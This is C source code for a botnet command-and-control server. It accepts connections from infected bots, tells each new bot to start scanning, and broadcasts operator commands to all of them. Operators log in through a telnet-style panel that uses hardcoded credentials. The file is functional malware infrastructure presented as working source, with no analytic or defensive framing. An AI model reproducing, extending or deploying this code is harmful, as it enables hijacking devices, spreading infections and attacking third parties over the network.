#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>

#define MY_MGM_FLUNZYP "pain"
#define MY_MGM_FLUNZYU "pain"
#define MY_MGM_LORDP "Noto"
#define MY_MGM_LORDU "Noto"
#define MY_MGM_LIGHTP "Vixen"
#define MY_MGM_LIGHTU "Vixen"
#define MY_MGM_HAILP "Geoxy"
#define MY_MGM_HAILU "Geoxy"
#define MY_MGM_ASAPP "Weary"
#define MY_MGM_ASAPU "Weary"
#define MY_MGM_SDNP "PumpkinSpiceLatte69@@"
#define MY_MGM_SDNU "Lavagirl"
#define MY_MGM_PHP "HOSTGOTBOOTED"
#define MY_MGM_PHU "RoBeRT"
#define MY_MGM_DAVP "DisIzATempPazwurd"
#define MY_MGM_DAVU "DisIsATempLawgin"
#define MY_MGM_PORT 13

#define MAXFDS 1000000 // No way we actually reach this amount. Ever.
int FLUNZY=0, LIGHT=0, LORD=0, HAIL=0, ASAP=0, DAV=0, PH=0, SDN=0;

struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
struct args {
        int sock;
        struct sockaddr_in cli_addr;
};
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}

void trim(char *str) // Remove whitespace from a string and properly null-terminate it.
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{ // man fcntl
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        /*
              F_SETFL (int)
              Set  the  file  status  flags  to  the  value specified by arg.  File access mode (O_RDONLY, O_WRONLY, O_RDWR) and file creation flags (i.e., O_CREAT, O_EXCL, O_NOCTTY, O_TRUNC) in arg are
              ignored.  On Linux this command can change only the O_APPEND, O_ASYNC, O_DIRECT, O_NOATIME, and O_NONBLOCK flags.
        */
        s = fcntl (sfd, F_SETFL, flags);
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
        hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
        hints.ai_flags = AI_PASSIVE;     /* All interfaces */
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, int managementcmd) // sends message to all bots, notifies the management clients of this happening
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0; // Don't send pings to management. Why? Because a human is going to ignore it.
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
				if(managementcmd == 1){
					if(sendMGM && managements[i].connected)
					{
							if(us == FLUNZY){
								send(i, "\x1b[31m", 6, MSG_NOSIGNAL);
								send(i, "Scarface:\x1b[31m ", 13, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m| \x1b[31m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == LIGHT){
								send(i, "\x1b[32m", 6, MSG_NOSIGNAL);
								send(i, "Vixen:\x1b[32m ", 13, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[32m| \x1b[32m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == HAIL){
								send(i, "\x1b[34m", 6, MSG_NOSIGNAL);
								send(i, "Geoxy:\x1b[36m ", 12, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[36m| \x1b[36m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == LORD){
								send(i, "\x1b[34m", 6, MSG_NOSIGNAL);
								send(i, "Notorious:\x1b[34m ", 12, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[34m| \x1b[34m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == ASAP){
								send(i, "\x1b[33m", 6, MSG_NOSIGNAL);
								send(i, "Weary:\x1b[33m ", 13, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[33m| \x1b[33m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == SDN){
								send(i, "\x1b[34m", 6, MSG_NOSIGNAL);
								send(i, "Serlo:\x1b[37m ", 13, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[36m| \x1b[37m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == PH){
								send(i, "\x1b[34m", 6, MSG_NOSIGNAL);
								send(i, "Versonic:\x1b[37m ", 16, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[36m| \x1b[37m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
							else if(us == DAV){
								send(i, "\x1b[34m", 6, MSG_NOSIGNAL);
								send(i, "BackupLogin:\x1b[37m ", 19, MSG_NOSIGNAL);
								printf("sent to fd: %d\n", i);
								send(i, msg, strlen(msg), MSG_NOSIGNAL);
								if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[36m| \x1b[37m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
								else send(i, "\n", 1, MSG_NOSIGNAL);
							}
					}
				}
				else{
					printf("sent to fd: %d\n", i);
					send(i, msg, strlen(msg), MSG_NOSIGNAL);
					if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[3m| \x1b[37m", 15, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
					else send(i, "\n", 1, MSG_NOSIGNAL);
				}
        }
        free(wot);
}

void *epollEventLoop(void *useless) // the big loop used to control each bot asynchronously. Many threads of this get spawned.
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;

                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len); // accept a connection from a bot.
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }

                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) // check for duplicate clients by seeing if any have the same IP as the one connecting
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;

                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }

                                        if(dup)
                                        {
                                                printf("dup client\n"); // warns the operator on command line
                                                if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; } // orders all the bots to immediately kill themselves if we see a duplicate client! MAXIMUM PARANOIA
                                                if(send(infd, "DUP\n", 4, MSG_NOSIGNAL) == -1) { close(infd); continue; } // same thing as above.
                                                close(infd);
                                                continue;
                                        }

                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }

                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }

                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);

                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                        if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        if(send(thefd, "PING\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }

                                                printf("buf: \"%s\"\n", buf);
                                        }

                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }

                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}

unsigned int clientsConnected() // counts the number of bots connected by looping over every possible file descriptor and checking if it's connected or not
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }

        return total;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
	register int iop;
	int pdes[2], fds, pid;

	if (*type != 'r' && *type != 'w' || type[1]) return -1;

	if (pipe(pdes) < 0) return -1;
	if (fdopen_pids == NULL) {
		if ((fds = getdtablesize()) <= 0) return -1;
		if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
		memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
	}

	switch (pid = vfork())
	{
	case -1:
		close(pdes[0]);
		close(pdes[1]);
		return -1;
	case 0:
		if (*type == 'r') {
			if (pdes[1] != 1) {
				dup2(pdes[1], 1);
				close(pdes[1]);
			}
			close(pdes[0]);
		} else {
			if (pdes[0] != 0) {
				(void) dup2(pdes[0], 0);
				(void) close(pdes[0]);
			}
			(void) close(pdes[1]);
		}
		execl("/bin/sh", "sh", "-c", program, NULL);
		_exit(127);
	}
	if (*type == 'r') {
		iop = pdes[0];
		(void) close(pdes[1]);
	} else {
		iop = pdes[1];
		(void) close(pdes[0]);
	}
	fdopen_pids[iop] = pid;
	return (iop);
}

int fdpclose(int iop)
{
	register int fdes;
	sigset_t omask, nmask;
	int pstat;
	register int pid;

	if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
	(void) close(iop);
	sigemptyset(&nmask);
	sigaddset(&nmask, SIGINT);
	sigaddset(&nmask, SIGQUIT);
	sigaddset(&nmask, SIGHUP);
	(void) sigprocmask(SIG_BLOCK, &nmask, &omask);
	do {
		pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
	} while (pid == -1 && errno == EINTR);
	(void) sigprocmask(SIG_SETMASK, &omask, NULL);
	fdopen_pids[fdes] = 0;
	return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}
void *titleWriter(void *sock) // just an informational banner
{
        // this LOOKS vulnerable, but it's actually not.
        // there's no way we can have 2000 digits' worth of clients/bots connected to overflow that char array
		int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;Bots connected: %d | Users connected: %d%c", '\033', clientsConnected(), managesConnected, '\007');
                // \007 is a bell character... causes a beep. Why is there a beep here?
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;

                sleep(2);
        }
}
void *telnetWorker(void *sock)
{
	    int thefd = (int)sock;
        managesConnected++;
        pthread_t title;
        char buf[2048];
		char* nickstring;
        memset(buf, 0, sizeof buf);

        if(send(thefd, "\x1b[32mNickname:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		nickstring = ("%s", buf);
		if(strcmp(nickstring, MY_MGM_FLUNZYU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_FLUNZYP) != 0) goto failed;
			memset(buf, 0, 2048);
			FLUNZY = thefd;
			if(FLUNZY == LIGHT){
				LIGHT = 0;
			}
			else if(FLUNZY == HAIL){
				HAIL = 0;
			}
			else if(FLUNZY == LORD){
				LORD = 0;
			}
			else if(FLUNZY == ASAP){

				ASAP = 0;
			}
			else if(FLUNZY == SDN){

				SDN = 0;
			}
			else if(FLUNZY == DAV){

				DAV = 0;
			}
			else if(FLUNZY == PH){

				PH = 0;
			}
			goto fak;
		}
		if(strcmp(nickstring, MY_MGM_ASAPU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_ASAPP) != 0) goto failed;
			memset(buf, 0, 2048);
			ASAP = thefd;
			if(ASAP == LIGHT){
				LIGHT = 0;
			}
			else if(ASAP == HAIL){
				HAIL = 0;
			}
			else if(ASAP == LORD){
				LORD = 0;
			}
			else if(ASAP == FLUNZY){
				FLUNZY = 0;
			}
			else if(ASAP == SDN){

				SDN = 0;
			}
			else if(ASAP == DAV){

				DAV = 0;
			}
			else if(ASAP == PH){

				PH = 0;
			}
			goto fak;
		}
		else if(strcmp(nickstring, MY_MGM_LIGHTU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_LIGHTP) != 0) goto failed;
			memset(buf, 0, 2048);
			LIGHT = thefd;
			if(LIGHT == FLUNZY){
				FLUNZY = 0;
			}
			else if(LIGHT == HAIL){
				HAIL = 0;
			}
			else if(LIGHT == LORD){
				LORD = 0;
			}
			else if(LIGHT == ASAP){
				ASAP = 0;
			}
			else if(LIGHT == SDN){

				SDN = 0;
			}
			else if(LIGHT == DAV){

				DAV = 0;
			}
			else if(LIGHT == PH){

				PH = 0;
			}
			goto fak;
		}
		else if(strcmp(nickstring, MY_MGM_LORDU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_LORDP) != 0) goto failed;
			memset(buf, 0, 2048);
			LORD = thefd;
			if(LORD == LIGHT){
				LIGHT = 0;
			}
			else if(LORD == HAIL){
				HAIL = 0;
			}
			else if(LORD == FLUNZY){
				FLUNZY = 0;
			}
			else if(LORD == ASAP){
				ASAP = 0;
			}
			else if(LORD == SDN){

				SDN = 0;
			}
			else if(LORD == DAV){

				DAV = 0;
			}
			else if(LORD == PH){

				PH = 0;
			}
			goto fak;
		}
		else if(strcmp(nickstring, MY_MGM_HAILU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_HAILP) != 0) goto failed;
			memset(buf, 0, 2048);
			HAIL = thefd;
			if(HAIL == LIGHT){
				LIGHT = 0;
			}
			else if(HAIL == FLUNZY){
				FLUNZY = 0;
			}
			else if(HAIL == LORD){
				LORD = 0;
			}
			else if(HAIL == ASAP){
				ASAP = 0;
			}
			else if(HAIL == SDN){

				SDN = 0;
			}
			else if(HAIL == DAV){

				DAV = 0;
			}
			else if(HAIL == PH){

				PH = 0;
			}
			goto fak;
		}
		else if(strcmp(nickstring, MY_MGM_SDNU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_SDNP) != 0) goto failed;
			memset(buf, 0, 2048);
			SDN = thefd;
			if(SDN == LIGHT){
				LIGHT = 0;
			}
			else if(SDN == FLUNZY){
				FLUNZY = 0;
			}
			else if(SDN == LORD){
				LORD = 0;
			}
			else if(SDN == ASAP){
				ASAP = 0;
			}
			else if(SDN == HAIL){

				HAIL = 0;
			}
			else if(SDN == DAV){

				DAV = 0;
			}
			else if(SDN == PH){

				PH = 0;
			}
			goto fak;
		}
		else if(strcmp(nickstring, MY_MGM_DAVU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_DAVP) != 0) goto failed;
			memset(buf, 0, 2048);
			DAV = thefd;
			if(DAV == LIGHT){
				LIGHT = 0;
			}
			else if(DAV == FLUNZY){
				FLUNZY = 0;
			}
			else if(DAV == LORD){
				LORD = 0;
			}
			else if(DAV == ASAP){
				ASAP = 0;
			}
			else if(DAV == SDN){

				SDN = 0;
			}
			else if(DAV == HAIL){

				HAIL = 0;
			}
			else if(DAV == PH){

				PH = 0;
			}
			goto fak;
		}
		else if(strcmp(nickstring, MY_MGM_PHU) == 0){
			if(send(thefd, "\x1b[32m*           VALID CREDENTIALS           *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[32mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
			if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
			trim(buf);
			if(strcmp(buf, MY_MGM_PHP) != 0) goto failed;
			memset(buf, 0, 2048);
			PH = thefd;
			if(PH == LIGHT){
				LIGHT = 0;
			}
			else if(PH == FLUNZY){
				FLUNZY = 0;
			}
			else if(PH == LORD){
				LORD = 0;
			}
			else if(PH == ASAP){
				ASAP = 0;
			}
			else if(PH == SDN){

				SDN = 0;
			}
			else if(PH == DAV){

				DAV = 0;
			}
			else if(PH == HAIL){

				HAIL= 0;
			}
			goto fak;
		}

		else if(strcmp(nickstring, MY_MGM_HAILU) != 0|| strcmp(nickstring, MY_MGM_FLUNZYU) != 0 || strcmp(nickstring, MY_MGM_LIGHTU) != 0 || strcmp(nickstring, MY_MGM_LORDU) != 0 || strcmp(nickstring, MY_MGM_SDNU) != 0 || strcmp(nickstring, MY_MGM_DAVU) != 0|| strcmp(nickstring, MY_MGM_PHU) != 0){
			if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[31m*          INVALID CREDENTIALS          *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			goto end;
		}
		failed:
			if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, "\x1b[31m*          INVALID CREDENTIALS          *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
			goto end;
		fak:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock); /* writes the informational banner to the admin after a login */
        if(send(thefd, "\x1b[1m\x1b[37m*****************************************\r\n", 54, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*          \x1b[31mWELCOME TO THE NET\x1b[37m           *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*         \x1b[31mIN BATTLES WE WIN\x1b[37m             *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*****************************************\r\n\r\n\x1b[37m| \x1b[37m", 59, MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
                trim(buf);
                if(send(thefd, "\x1b[31m| \x1b[37m", 12, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
				char* falsejuan = ">- oohkillem69";
				char* realjuan = "!* OHKILLEM";
				char* realljuan = "! OHKILLEM";
				char* falsetu = ">- turndatsheitawf";
				char* realtu = "!* SCANNER OFF";
				char* realltu = "! SCANNER OFF";
				char* nosh4u = "! SH";
				char* nosh4u2 = "!* SH";
				if(strstr(buf, "! ") != NULL || strstr(buf, "!* ") != NULL || strstr(buf, ">- ") != NULL){
					if(strcmp(buf, falsejuan) == 0){
						broadcast(realjuan, thefd, 0);
						memset(buf, 0, 2048);
					}
					else if(strcmp(buf, falsetu) == 0){
						broadcast(realtu, thefd, 0);
						memset(buf, 0, 2048);
					}
					else if(strcmp(buf, realjuan) == 0 || strcmp(buf, realtu) ==0 || strcmp(buf, realljuan) == 0 || strcmp(buf, realltu) == 0){
						goto end;
					}
					else {
						broadcast(buf, thefd, 0);
						memset(buf, 0, 2048);
					}
				}
				else{
					broadcast(buf, thefd, 1); // take a command, send it to the bots
					memset(buf, 0, 2048);
				}
        }
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(void *useless)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(MY_MGM_PORT);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}

int main(int argc, char *argv[])
{
        signal(SIGPIPE, SIG_IGN);

        int s, threads;
        struct epoll_event event;

        if (argc != 3)
        {
                fprintf (stderr, "IDIOT PROOF!\n");
                exit (EXIT_FAILURE);
        }
        fileFD = NULL;
        threads = atoi(argv[2]);

        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();

        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();

        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }

        epollFD = epoll_create1 (0);
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }

        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }

        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }

        pthread_create(&thread[0], NULL, &telnetListener, (void *)NULL);

        while(1)
        {
                sleep(60);
        }

        close (listenFD);

        return EXIT_SUCCESS;
}
